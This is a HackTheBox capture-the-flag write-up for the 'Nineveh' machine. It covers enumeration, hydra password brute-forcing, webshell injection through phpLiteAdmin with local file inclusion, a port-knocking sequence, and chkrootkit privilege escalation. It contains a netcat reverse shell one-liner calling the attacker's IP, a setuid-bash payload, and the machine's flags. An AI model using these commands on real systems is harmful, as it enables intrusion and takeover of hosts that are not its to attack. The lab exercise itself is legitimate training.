---
title: "Nineveh"
date: 2025-06-20
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Nineveh

![](assets/Pasted%20image%2020250611114932.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.43 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 11:50 CEST
Nmap scan report for 10.10.10.43
Host is up (0.042s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Google Android 8.X (91%), Synology DiskStation Manager 7.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.11 - 4.9 (91%), Linux 3.13 or 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   42.86 ms 10.10.14.1
2   42.89 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.96 seconds
```

The site at `80` is the default page

![](assets/Pasted%20image%2020250611115213.png)

The site at `443` shows a picture

![](assets/Pasted%20image%2020250611115257.png)

`gobuster` discovers [`http://10.10.10.43/department`](http://10.10.10.43/department) path and [`https://10.10.10.43/db`](https://10.10.10.43/db), [`https://10.10.10.43/secure_notes`](https://10.10.10.43/secure_notes) and [`https://10.10.10.43/server-status`](https://10.10.10.43/server-status)

```shell
$ gobuster dir -u http://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 80 -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]
```

```shell
$ gobuster dir -u https://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 80 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

`/department` shows a login form

![](assets/Pasted%20image%2020250611115758.png)

`/db` shows a phpliteadmin 1.9 form

![](assets/Pasted%20image%2020250611115813.png)

`/secure_notes` is only an image

![](assets/Pasted%20image%2020250611122247.png)

Using `hydra` we get the password for the phpliteadmin

```shell
$ hydra 10.10.10.43 -l test -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

![](assets/Pasted%20image%2020250611123534.png)

`password123`

![](assets/Pasted%20image%2020250611122840.png)

Using `searchsploit` we find a way to inject a webshell by creating a table.

![](assets/Pasted%20image%2020250611125115.png)

Create a database ending in `.php` and add a table with a `txt` field containing a webshell.

![](assets/Pasted%20image%2020250611130127.png)

The path to the shell

![](assets/Pasted%20image%2020250611130007.png)

But for now, I can't reach it.


We can also try `hydra` at `/management`

```shell
$ hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form /department/login.php:"username=^USER^&password=^PASS^:Invalid Password"
```

![](assets/Pasted%20image%2020250611123631.png)

`admin:1q2w3e4r5t`

![](assets/Pasted%20image%2020250611124432.png)

Going to notes

![](assets/Pasted%20image%2020250611124506.png)

Looking for an LFI, it only works if we leave `ninevehNotes` strings and then the path traversal

![](assets/Pasted%20image%2020250611130723.png)

Trying the path to the webshell from before:

![](assets/Pasted%20image%2020250611130602.png)

## Initial Access

So if we put a bash reverse shell.

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.17 443 >/tmp/f

# url encoded
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.17%20443%20%3E%2Ftmp%2Ff
```


```shell
$ sudo rlwrap nc -lnvp 443    
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.43] 44224
bash: cannot set terminal process group (1401): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ whoami
whoami
www-data
```

Looking at the picture from `/secure_notes` we find files inside

```shell
$ binwalk nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

In the other hand, we have a `knockd` service running

![](assets/Pasted%20image%2020250611134605.png)

```shell
www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

So looking at the config, if we hit those ports in the same order, the `ssh` port will open.

```shell
$ for x in 571 290 911 22; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
571/tcp filtered umeter

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST
Nmap scan report for 10.10.10.43
Host is up (0.041s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

Now we can enter via `ssh` with the private key.

```shell
$ ssh amrois@10.10.10.43 -i nineveh.priv   
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
ED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
amrois
```

Get the flag

```shell
amrois@nineveh:~$ cat user.txt
5ee541c07893cc8693adf3e4ef03f435
```

## Privilege Escalation

Transfer `pspy64` to the host and execute it.

![](assets/Pasted%20image%2020250612095534.png)

`chkrootkit` is being executed, so searching with `searchsploit`

![](assets/Pasted%20image%2020250612100029.png)

```shell
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

```shell
amrois@nineveh:/tmp$ echo 'chmod +s /bin/bash' > update && chmod +x update
```

![](assets/Pasted%20image%2020250612100235.png)

```shell
bash-4.3# whoami                                                                                                    
root              
```

## Post Exploitation

Get the flag

```shell
bash-4.3# cat root.txt                                                                                              
e5830f7bddc8ce23ad62477805a1e1c4
```
